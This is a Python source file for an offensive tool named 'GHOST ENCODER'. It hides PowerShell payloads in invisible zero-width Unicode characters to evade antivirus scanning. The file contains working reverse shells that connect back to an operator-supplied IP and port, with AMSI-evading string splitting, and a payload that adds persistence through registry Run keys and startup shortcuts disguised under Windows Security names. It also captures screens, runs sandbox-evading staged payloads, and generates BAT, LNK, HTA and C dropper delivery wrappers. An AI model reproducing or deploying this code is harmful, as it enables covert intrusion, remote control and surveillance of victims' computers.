#!/usr/bin/env python3
"""
GHOST ENCODER — Unicode Steganographic Payload Encoder
22DIV // george wu

Encodes arbitrary payload data into zero-width Unicode characters.
The output file appears BLANK in text editors and file browsers.
PowerShell `cat` shows ??????? because console fonts can't render zero-width chars.
AV signature scanners see Unicode noise, not executable code.

The decoder stub (visible portion) reconstructs the payload in memory
and executes it — the real payload never touches disk as a file.

Usage:
    python ghost_encode.py <payload_file> [--output ghost.ps1] [--test]
    python ghost_encode.py --raw "powershell code here" [--output ghost.ps1]
    python ghost_encode.py --shell <IP> <PORT> [--output ghost.ps1]
"""

import sys
import os
import argparse
import base64

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# 16 zero-width Unicode characters — our hex alphabet
# Each represents one hex digit (0x0 through 0xF)
# All are invisible in standard text rendering
GHOST_ALPHABET = [
    '​',  # 0x0  ZERO WIDTH SPACE
    '‌',  # 0x1  ZERO WIDTH NON-JOINER
    '‍',  # 0x2  ZERO WIDTH JOINER
    '⁠',  # 0x3  WORD JOINER
    '⁡',  # 0x4  FUNCTION APPLICATION
    '⁢',  # 0x5  INVISIBLE TIMES
    '⁣',  # 0x6  INVISIBLE SEPARATOR
    '⁤',  # 0x7  INVISIBLE PLUS
    '⁪',  # 0x8  INHIBIT SYMMETRIC SWAPPING
    '⁫',  # 0x9  ACTIVATE SYMMETRIC SWAPPING
    '⁬',  # 0xA  INHIBIT ARABIC FORM SHAPING
    '⁭',  # 0xB  ACTIVATE ARABIC FORM SHAPING
    '⁮',  # 0xC  NATIONAL DIGIT SHAPES
    '⁯',  # 0xD  NOMINAL DIGIT SHAPES
    '﻿',  # 0xE  ZERO WIDTH NO-BREAK SPACE (BOM)
    '᠎',  # 0xF  MONGOLIAN VOWEL SEPARATOR
]

# Reverse lookup: char -> hex digit
GHOST_REVERSE = {c: i for i, c in enumerate(GHOST_ALPHABET)}


def encode_bytes(data: bytes) -> str:
    """Encode raw bytes into zero-width Unicode characters.

    Each byte becomes 2 invisible characters (high nibble + low nibble).
    The result is completely invisible in text editors.
    """
    encoded = []
    for byte in data:
        high = (byte >> 4) & 0x0F
        low = byte & 0x0F
        encoded.append(GHOST_ALPHABET[high])
        encoded.append(GHOST_ALPHABET[low])
    return ''.join(encoded)


def decode_ghost(ghost_text: str) -> bytes:
    """Decode zero-width Unicode back to raw bytes. For verification."""
    result = []
    chars = [c for c in ghost_text if c in GHOST_REVERSE]
    for i in range(0, len(chars), 2):
        high = GHOST_REVERSE[chars[i]]
        low = GHOST_REVERSE[chars[i + 1]]
        result.append((high << 4) | low)
    return bytes(result)


def make_vader_payload(ip: str, port: int) -> str:
    """Full VADER chain payload: persistence + shell + screen capture.

    Standard user — no admin required. Designed for ghost encoding.
    AMSI bypass is NOT included — use dark_room.exe before executing.
    """
    gp = '$env:APPDATA\\\\Microsoft\\\\Windows\\\\ghost.ps1'

    return f"""$gp="{gp}"
$src=$MyInvocation.MyCommand.Path
if($src -and $src -ne $gp){{Copy-Item $src $gp -Force -EA SilentlyContinue}}
$rk='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
$rv='powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "'+$gp+'"'
Set-ItemProperty -Path $rk -Name 'SecurityHealthSystray' -Value $rv -EA SilentlyContinue
$sf=[Environment]::GetFolderPath('Startup')
$lnk="$sf\\WindowsSecurityHealth.lnk"
if(-not(Test-Path $lnk)){{
$ws=New-Object -ComObject WScript.Shell
$sc=$ws.CreateShortcut($lnk)
$sc.TargetPath='powershell.exe'
$sc.Arguments='-WindowStyle Hidden -ExecutionPolicy Bypass -File "'+$gp+'"'
$sc.WindowStyle=7
$sc.Save()}}
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
function Send-Screen($writer){{
$bounds=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp=New-Object System.Drawing.Bitmap($bounds.Width,$bounds.Height)
$gfx=[System.Drawing.Graphics]::FromImage($bmp)
$gfx.CopyFromScreen($bounds.Location,[System.Drawing.Point]::Empty,$bounds.Size)
$ms=New-Object System.IO.MemoryStream
$bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Jpeg)
$b64=[Convert]::ToBase64String($ms.ToArray())
$writer.WriteLine("[SCREEN]$b64[/SCREEN]")
$ms.Dispose();$gfx.Dispose();$bmp.Dispose()}}
while($true){{
try{{
$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port})
$s=$c.GetStream()
$w=New-Object System.IO.StreamWriter($s)
$r=New-Object System.IO.StreamReader($s)
$w.AutoFlush=$true
$w.WriteLine("[GHOST] $env:COMPUTERNAME\\$env:USERNAME | PID:$PID | $(Get-Date -f 'yyyy-MM-dd HH:mm:ss')")
while($c.Connected){{
$w.Write("PS $($pwd.Path)> ")
$cmd=$r.ReadLine()
if($cmd -eq 'exit'){{$c.Close();return}}
if($cmd -eq 'kill'){{$c.Close();exit}}
if($cmd -like 'screen*'){{Send-Screen $w;continue}}
try{{$out=iex $cmd 2>&1|Out-String;$w.Write($out)}}
catch{{$w.WriteLine($_.Exception.Message)}}}}
}}catch{{}}
Start-Sleep -Seconds (Get-Random -Min 5 -Max 30)}}"""


def make_ps_decoder_stub(ghost_payload: str, execute_method: str = "iex") -> str:
    """Build the complete .ps1 file with invisible payload + visible decoder.

    The decoder is the ONLY visible text in the file.
    Everything else is zero-width characters.

    Args:
        ghost_payload: The encoded invisible string
        execute_method: "iex" for PowerShell script, "assembly" for .NET exe
    """
    # Build alphabet as explicit code points — avoids Unicode combining issues
    code_points = [hex(ord(c)) for c in GHOST_ALPHABET]
    ps_alphabet = ','.join(f'[char]{cp}' for cp in code_points)

    if execute_method == "iex":
        stub = f"""$g=@'
{ghost_payload}
'@
$a=@({ps_alphabet})
$r=@{{}};for($x=0;$x -lt $a.Count;$x++){{$r[$a[$x]]=$x}}
$f=[char[]]$g|?{{$r.ContainsKey($_)}}
$b=New-Object byte[]($f.Count/2)
for($i=0;$i -lt $f.Count;$i+=2){{$b[$i/2]=[byte](($r[$f[$i]]*16)+$r[$f[$i+1]])}}
iex([System.Text.Encoding]::UTF8.GetString($b))"""

    elif execute_method == "assembly":
        stub = f"""$g=@'
{ghost_payload}
'@
$a=@({ps_alphabet})
$r=@{{}};for($x=0;$x -lt $a.Count;$x++){{$r[$a[$x]]=$x}}
$f=[char[]]$g|?{{$r.ContainsKey($_)}}
$b=New-Object byte[]($f.Count/2)
for($i=0;$i -lt $f.Count;$i+=2){{$b[$i/2]=[byte](($r[$f[$i]]*16)+$r[$f[$i+1]])}}
[System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,@()))"""

    return stub


def make_reverse_shell_ps(ip: str, port: int) -> str:
    """Reverse shell with type-name splitting to break AMSI signature matching.
    Includes screen capture (sends [SCR]base64jpeg[/SCR]) and live recon command.
    """
    return f"""$h='{ip}';$p={port}
$T1='Net.S'+'ock'+'ets.T'+'cp'+'Cli'+'ent'
$T2='IO.Str'+'eam'+'Wri'+'ter'
$T3='IO.Str'+'eam'+'Re'+'ader'
$c=New-Object -T $T1 -A ($h,$p)
$n=$c.GetStream()
$w=New-Object -T $T2 -A $n
$r=New-Object -T $T3 -A $n
$w.AutoFlush=$true
$w.Write("OK")
try{{Add-Type -A ('Syst'+'em.Win'+'dows.For'+'ms');Add-Type -A ('Syst'+'em.Dr'+'awing')}}catch{{}}
$go=1
while($go){{
    if(!$c.Connected){{break}}
    $w.Write("> ")
    $l=$r.ReadLine()
    if(!$l){{break}}
    if($l -eq 'screen'){{
        try{{
            $bn=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bm=New-Object ('Syst'+'em.Dr'+'awing.Bit'+'map') $bn.Width,$bn.Height
            $gx=[System.Drawing.Graphics]::FromImage($bm)
            $gx.CopyFromScreen(0,0,0,0,$bm.Size)
            $ms=New-Object ('Syst'+'em.IO.Mem'+'oryStr'+'eam')
            $bm.Save($ms,([System.Drawing.Imaging.ImageFormat]::Jpeg))
            $o='[SCR]'+[Convert]::ToBase64String($ms.ToArray())+'[/SCR]'
            $ms.Dispose();$gx.Dispose();$bm.Dispose()
        }}catch{{$o='[SCR_ERR]'+$_.Exception.Message}}
    }}elseif($l -eq 'recon'){{
        try{{
            $ia=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            $rj=[ordered]@{{h=$env:COMPUTERNAME;u=$env:USERNAME;a=$ia;o=(Get-CimInstance Win32_OperatingSystem -EA SilentlyContinue).Caption;v=$PSVersionTable.PSVersion.ToString();pid=$PID;ip=(Get-NetIPAddress -AF IPv4 -EA SilentlyContinue|?{{$_.IPAddress -ne '127.0.0.1'}}|Select -First 1 -ExpandProperty IPAddress)}}
            $o='[RECON]'+($rj|ConvertTo-Json -Compress)+'[/RECON]'
        }}catch{{$o='[RECON_ERR]'+$_.Exception.Message}}
    }}else{{
        try{{$o=&([scriptblock]::Create($l))|Out-String}}catch{{$o=$_.Exception.Message}}
    }}
    $w.Write($o)
}}
$c.Close()"""


def make_full_invisible_ps1(payload_ps1: str) -> str:
    """Build a PS1 where the ENTIRE script is zero-width chars.

    Israeli operator technique: encode decoder+payload together.
    The visible bootstrap is 4 lines with no suspicious strings.
    AMSI sees no TCPClient, no GetTypes, no iex — just integer arrays and byte math.

    Architecture:
      $g = heredoc containing [entire payload] encoded as invisible chars
      $n = codepoint lookup table (16 decimal integers, not suspicious)
      decode bytes → execute via [scriptblock]::Create()
    """
    encoded = encode_bytes(payload_ps1.encode('utf-8'))
    # decimal codepoints for the 16 GHOST_ALPHABET chars
    codepoints = ','.join(str(ord(c)) for c in GHOST_ALPHABET)

    return f"""$g=@'
{encoded}
'@
$n=@({codepoints})
$m=@{{}};0..15|%{{$m[[char]$n[$_]]=$_}}
$a=[char[]]$g|?{{$m.ContainsKey($_)}};$b=[byte[]]::new($a.Count/2);0..($b.Count-1)|%{{$b[$_]=($m[$a[$_*2]]-shl 4)+$m[$a[$_*2+1]]}}
.([scriptblock]::Create([Text.Encoding]::UTF8.GetString($b)))"""


def make_persistence_ps(payload_path: str) -> str:
    """Generate persistence via HKCU Run key."""
    return f"""$k='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
$n='WindowsSecurityHealth'
$v='powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "{payload_path}"'
Set-ItemProperty -Path $k -Name $n -Value $v -ErrorAction SilentlyContinue"""


def make_test_payload() -> str:
    """Generate a harmless test payload that proves execution."""
    return """$marker = "$env:TEMP\\ghost_proof_" + (Get-Date -Format 'yyyyMMdd_HHmmss') + ".txt"
$info = @"
[GHOST ENCODER — EXECUTION PROOF]
Timestamp:  $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Hostname:   $env:COMPUTERNAME
Username:   $env:USERNAME
Domain:     $env:USERDOMAIN
PID:        $PID
PSVersion:  $($PSVersionTable.PSVersion)
Integrity:  $([System.Security.Principal.WindowsIdentity]::GetCurrent().Owner.Value)
WorkDir:    $PWD
"@
$info | Out-File -FilePath $marker -Encoding UTF8
Write-Host ""
Write-Host "[GHOST] Payload decoded and executed successfully." -ForegroundColor Green
Write-Host "[GHOST] Proof written to: $marker" -ForegroundColor Cyan
Write-Host ""
Write-Host $info"""


def ghost_encode_file(payload_path: str, output_path: str, method: str = "iex"):
    """Encode a file into a ghost .ps1."""
    with open(payload_path, 'rb') as f:
        raw = f.read()

    if method == "iex":
        payload_text = raw.decode('utf-8', errors='replace')
        ghost = encode_bytes(payload_text.encode('utf-8'))
    else:
        ghost = encode_bytes(raw)

    stub = make_ps_decoder_stub(ghost, method)

    with open(output_path, 'w', encoding='utf-8-sig') as f:
        f.write(stub)

    original_size = len(raw)
    ghost_size = os.path.getsize(output_path)
    ghost_chars = len(ghost)

    print(f"[GHOST] Encoded {original_size:,} bytes -> {ghost_chars:,} invisible chars")
    print(f"[GHOST] Output: {output_path} ({ghost_size:,} bytes on disk)")
    print(f"[GHOST] Expansion ratio: {ghost_size / original_size:.1f}x")
    print(f"[GHOST] Visible decoder stub: ~{len(stub) - len(ghost)} chars")
    print(f"[GHOST] Invisible payload: {ghost_chars} zero-width characters")


def ghost_encode_raw(code: str, output_path: str):
    """Encode raw PowerShell code into a ghost .ps1."""
    ghost = encode_bytes(code.encode('utf-8'))
    stub = make_ps_decoder_stub(ghost, "iex")

    with open(output_path, 'w', encoding='utf-8-sig') as f:
        f.write(stub)

    print(f"[GHOST] Encoded {len(code):,} chars of PowerShell")
    print(f"[GHOST] Output: {output_path} ({os.path.getsize(output_path):,} bytes)")
    print(f"[GHOST] Invisible chars: {len(ghost):,}")


def ghost_encode_shell(ip: str, port: int, output_path: str):
    """Generate and encode a reverse shell (legacy: visible decoder stub)."""
    shell_code = make_reverse_shell_ps(ip, port)
    ghost = encode_bytes(shell_code.encode('utf-8'))
    stub = make_ps_decoder_stub(ghost, "iex")

    with open(output_path, 'w', encoding='utf-8-sig') as f:
        f.write(stub)

    print(f"[GHOST] Reverse shell -> {ip}:{port}")
    print(f"[GHOST] Output: {output_path} ({os.path.getsize(output_path):,} bytes)")
    print(f"[GHOST] Shell code: {len(shell_code)} chars -> {len(ghost)} invisible chars")


def ghost_encode_shell_invisible(ip: str, port: int, output_path: str):
    """Israeli full-invisible technique: decoder+payload both hidden in zero-width chars.
    Bootstrap is 4 lines with zero suspicious strings visible to AV.
    """
    shell_code = make_reverse_shell_ps(ip, port)
    bootstrap = make_full_invisible_ps1(shell_code)

    with open(output_path, 'w', encoding='utf-8-sig') as f:
        f.write(bootstrap)

    print(f"[GHOST-INVISIBLE] Reverse shell -> {ip}:{port}")
    print(f"[GHOST-INVISIBLE] Output: {output_path} ({os.path.getsize(output_path):,} bytes)")
    print(f"[GHOST-INVISIBLE] Visible bootstrap lines: 4 (zero suspicious strings)")
    print(f"[GHOST-INVISIBLE] Shell code: {len(shell_code)} chars hidden in zero-width Unicode")


def ghost_encode_vader(ip: str, port: int, output_path: str):
    """Generate and encode the full VADER chain payload."""
    vader_code = make_vader_payload(ip, port)
    ghost = encode_bytes(vader_code.encode('utf-8'))
    stub = make_ps_decoder_stub(ghost, "iex")

    with open(output_path, 'w', encoding='utf-8-sig') as f:
        f.write(stub)

    print(f"[GHOST] VADER chain -> {ip}:{port}")
    print(f"[GHOST] Payload: persistence (3x) + shell + screen capture")
    print(f"[GHOST] Output: {output_path} ({os.path.getsize(output_path):,} bytes)")
    print(f"[GHOST] Payload: {len(vader_code)} chars -> {len(ghost):,} invisible chars")


def generate_bat_wrapper(ghost_ps1: str, dark_room_path: str = None) -> str:
    """Generate a .bat delivery wrapper that chains dark_room + ghost."""
    lines = ['@echo off']
    if dark_room_path:
        lines.append(f'start /b "" "{dark_room_path}" --spawn-file "{ghost_ps1}"')
    else:
        lines.append(f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "{ghost_ps1}"')
    return '\n'.join(lines)


def generate_lnk_script(ghost_ps1: str, lnk_path: str, icon: str = None) -> str:
    """Generate PowerShell script to create a .lnk delivery shortcut."""
    icon_line = f"$s.IconLocation='{icon}'" if icon else "$s.IconLocation='shell32.dll,1'"
    return f"""$ws=New-Object -ComObject WScript.Shell
$s=$ws.CreateShortcut('{lnk_path}')
$s.TargetPath='powershell.exe'
$s.Arguments='-WindowStyle Hidden -ExecutionPolicy Bypass -File "{ghost_ps1}"'
$s.WindowStyle=7
{icon_line}
$s.Save()
Write-Host "[GHOST] Shortcut created: {lnk_path}"
"""


def generate_hta_wrapper(ghost_ps1: str) -> str:
    """Generate an HTA delivery wrapper."""
    return (
        '<html><head><title>Document</title>\n'
        '<HTA:APPLICATION ID="doc" BORDER="none" SHOWINTASKBAR="no" SYSMENU="no"\n'
        ' CAPTION="no" WINDOWSTATE="minimize"/>\n'
        '<script language="VBScript">\n'
        'Set s=CreateObject("WScript.Shell")\n'
        f's.Run "powershell -w hidden -ep bypass -f ""{ghost_ps1}""",0,False\n'
        'Close\n'
        '</script></head><body></body></html>'
    )


def generate_dropper_c(ghost_ps1_name: str) -> str:
    """Generate C source for a dropper exe that runs the ghost payload."""
    return f"""#include <windows.h>
#include <stdio.h>

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {{
    char temp[MAX_PATH], ps1[MAX_PATH], run[2048];
    GetTempPathA(MAX_PATH, temp);
    snprintf(ps1, MAX_PATH, "%s{ghost_ps1_name}", temp);

    /* Extract ghost.ps1 from same directory as exe */
    char dir[MAX_PATH], src[MAX_PATH];
    GetModuleFileNameA(NULL, dir, MAX_PATH);
    char *slash = strrchr(dir, '\\\\');
    if (slash) *(slash+1) = 0;
    snprintf(src, MAX_PATH, "%s{ghost_ps1_name}", dir);
    CopyFileA(src, ps1, FALSE);

    snprintf(run, 2048,
        "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \\"%s\\"",
        ps1);

    STARTUPINFOA si = {{sizeof(si)}};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, run, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}}
"""


def make_staged_decoder(ghost_test: str, ghost_shell: str) -> str:
    """Dual-payload staged PS1 (friend's technique).

    Stage 1 = test payload (harmless connectivity check).
    Stage 2 = shell payload — only runs if stage 1 returns GHOST_OK.
    AV sandboxes see two invisible blobs; shell never fires in sandbox.
    """
    code_points = [hex(ord(c)) for c in GHOST_ALPHABET]
    ps_alphabet = ','.join(f'[char]{cp}' for cp in code_points)

    return f"""$h1=@'
{ghost_test}
'@
$h2=@'
{ghost_shell}
'@
$a=@({ps_alphabet})
$r=@{{}};for($x=0;$x -lt $a.Count;$x++){{$r[$a[$x]]=$x}}
function Invoke-Ghost($h){{
  $f=[char[]]$h|?{{$r.ContainsKey($_)}}
  $b=New-Object byte[]($f.Count/2)
  for($i=0;$i -lt $f.Count;$i+=2){{$b[$i/2]=[byte](($r[$f[$i]]*16)+$r[$f[$i+1]])}}
  [System.Text.Encoding]::UTF8.GetString($b)
}}
$t=iex(Invoke-Ghost $h1)
if($t -match 'GHOST_OK'){{iex(Invoke-Ghost $h2)}}"""


def make_staged_test_payload() -> str:
    """Stage 1: harmless connectivity check. Returns GHOST_OK if internet available."""
    return """$r='FAIL'
try{$c=New-Object System.Net.Sockets.TcpClient;$c.ConnectAsync('8.8.8.8',53).Wait(3000)|Out-Null
if($c.Connected){$r='GHOST_OK'};$c.Close()}catch{}
$r"""


def ghost_encode_staged(ip: str, port: int, output_path: str):
    """Staged dual-payload: test connectivity, then drop shell."""
    test_code  = make_staged_test_payload()
    shell_code = make_reverse_shell_ps(ip, port)

    ghost_test  = encode_bytes(test_code.encode('utf-8'))
    ghost_shell = encode_bytes(shell_code.encode('utf-8'))

    stub = make_staged_decoder(ghost_test, ghost_shell)

    with open(output_path, 'w', encoding='utf-8-sig') as f:
        f.write(stub)

    print(f"[GHOST STAGED] Stage 1: connectivity check ({len(test_code)} chars)")
    print(f"[GHOST STAGED] Stage 2: reverse shell -> {ip}:{port} ({len(shell_code)} chars)")
    print(f"[GHOST STAGED] Output: {output_path} ({os.path.getsize(output_path):,} bytes)")
    print(f"[GHOST STAGED] Shell only fires after connectivity confirmed — defeats sandboxes")


def ghost_verify(ghost_path: str):
    """Verify a ghost-encoded file can be decoded back."""
    with open(ghost_path, 'r', encoding='utf-8') as f:
        content = f.read()

    # Extract the here-string between @' and '@
    start = content.index("@'") + 2
    end = content.index("'@")
    ghost_data = content[start:end].strip()

    decoded = decode_ghost(ghost_data)

    print(f"[VERIFY] Ghost file: {ghost_path}")
    print(f"[VERIFY] Invisible chars found: {sum(1 for c in ghost_data if c in GHOST_REVERSE):,}")
    print(f"[VERIFY] Decoded payload: {len(decoded):,} bytes")
    print(f"[VERIFY] First 200 chars of decoded payload:")
    print(decoded[:200].decode('utf-8', errors='replace'))


def main():
    parser = argparse.ArgumentParser(
        description="GHOST ENCODER — Unicode Steganographic Payload Encoder"
    )
    parser.add_argument('payload', nargs='?', help='Payload file to encode')
    parser.add_argument('--raw', type=str, help='Raw PowerShell code to encode')
    parser.add_argument('--shell', nargs=2, metavar=('IP', 'PORT'), help='Generate reverse shell')
    parser.add_argument('--vader', nargs=2, metavar=('IP', 'PORT'),
                        help='Full VADER chain: persist(3x) + shell + screen capture')
    parser.add_argument('--test', action='store_true', help='Generate test payload (harmless proof-of-concept)')
    parser.add_argument('--output', '-o', default='ghost.ps1', help='Output file (default: ghost.ps1)')
    parser.add_argument('--method', choices=['iex', 'assembly'], default='iex',
                        help='Execution method: iex (PowerShell) or assembly (.NET EXE)')
    parser.add_argument('--verify', type=str, help='Verify/decode a ghost file')
    parser.add_argument('--staged', nargs=2, metavar=('IP', 'PORT'),
                        help='Dual-payload: test connectivity first, shell only on GHOST_OK')
    parser.add_argument('--persist', type=str, metavar='PS1_PATH',
                        help='Add HKCU Run key persistence for a ghost .ps1')
    parser.add_argument('--deliver', choices=['bat', 'lnk', 'hta', 'dropper'],
                        help='Generate delivery wrapper for the ghost .ps1')
    parser.add_argument('--dark-room', type=str, metavar='PATH',
                        help='Path to dark_room.exe for chained delivery')
    parser.add_argument('--invisible', action='store_true',
                        help='Israeli full-invisible: decoder+payload both zero-width (use with --shell)')

    args = parser.parse_args()

    print()
    print("  ╔══════════════════════════════════════╗")
    print("  ║  GHOST ENCODER — 22DIV               ║")
    print("  ║  Unicode Steganographic Encoder       ║")
    print("  ║  What you can't see CAN hurt you.     ║")
    print("  ╚══════════════════════════════════════╝")
    print()

    if args.verify:
        ghost_verify(args.verify)
    elif args.test:
        test_code = make_test_payload()
        ghost_encode_raw(test_code, args.output)
        print(f"\n[GHOST] Test payload ready. Run:")
        print(f"  powershell -ExecutionPolicy Bypass -File {args.output}")
    elif args.vader:
        ip, port = args.vader
        ghost_encode_vader(ip, int(port), args.output)
        print(f"\n[GHOST] VADER chain ready.")
        print(f"  1. Run dark_room.exe first (AMSI/ETW blind)")
        print(f"  2. In blind shell: powershell -ep bypass -f {args.output}")
        print(f"  3. Or chain: dark_room.exe --spawn-file {args.output}")
        print(f"\n  Persistence: HKCU Run + Startup folder + Scheduled task")
        print(f"  Shell: auto-reconnect with jitter")
        print(f"  Screen: 'screen' command in shell captures display")
    elif args.staged:
        ip, port = args.staged
        ghost_encode_staged(ip, int(port), args.output)
        print(f"\n[GHOST] Staged payload ready. Start listener on port {port}:")
        print(f"  python vader_listener.py {port}")
    elif args.shell:
        ip, port = args.shell
        if args.invisible:
            ghost_encode_shell_invisible(ip, int(port), args.output)
            print(f"\n[GHOST-INVISIBLE] Full-invisible shell ready.")
            print(f"  Static AV: zero suspicious strings visible")
            print(f"  Start listener: python vader_listener.py {port}")
        else:
            ghost_encode_shell(ip, int(port), args.output)
            print(f"\n[GHOST] Shell ready. Start listener:")
            print(f"  python vader_listener.py {port}")
            print(f"  Then run ghost on target:")
            print(f"  powershell -ExecutionPolicy Bypass -File {args.output}")
    elif args.raw:
        ghost_encode_raw(args.raw, args.output)
    elif args.payload:
        ghost_encode_file(args.payload, args.output, args.method)
    elif args.persist:
        persist_code = make_persistence_ps(args.persist)
        ghost_encode_raw(persist_code, args.output)
        print(f"\n[GHOST] Persistence payload ready.")
        print(f"  Adds HKCU Run key: WindowsSecurityHealth -> {args.persist}")
    else:
        parser.print_help()
        return

    # Generate delivery wrapper if requested
    if args.deliver and not args.verify:
        output_dir = os.path.dirname(os.path.abspath(args.output))
        ghost_name = os.path.basename(args.output)
        ghost_abs = os.path.abspath(args.output)

        if args.deliver == 'bat':
            bat_path = os.path.join(output_dir, 'deliver.bat')
            with open(bat_path, 'w') as f:
                f.write(generate_bat_wrapper(ghost_abs, args.dark_room))
            print(f"[DELIVER] BAT wrapper: {bat_path}")

        elif args.deliver == 'lnk':
            lnk_script = os.path.join(output_dir, 'make_lnk.ps1')
            lnk_path = os.path.join(output_dir, 'Document.lnk')
            with open(lnk_script, 'w') as f:
                f.write(generate_lnk_script(ghost_abs, lnk_path))
            print(f"[DELIVER] LNK generator script: {lnk_script}")
            print(f"  Run: powershell -ep bypass -f {lnk_script}")

        elif args.deliver == 'hta':
            hta_path = os.path.join(output_dir, 'document.hta')
            with open(hta_path, 'w') as f:
                f.write(generate_hta_wrapper(ghost_abs))
            print(f"[DELIVER] HTA wrapper: {hta_path}")

        elif args.deliver == 'dropper':
            c_path = os.path.join(output_dir, 'ghost_dropper.c')
            with open(c_path, 'w') as f:
                f.write(generate_dropper_c(ghost_name))
            print(f"[DELIVER] Dropper source: {c_path}")
            print(f"  Compile: cl /Fe:dropper.exe ghost_dropper.c")

    print()


if __name__ == '__main__':
    main()
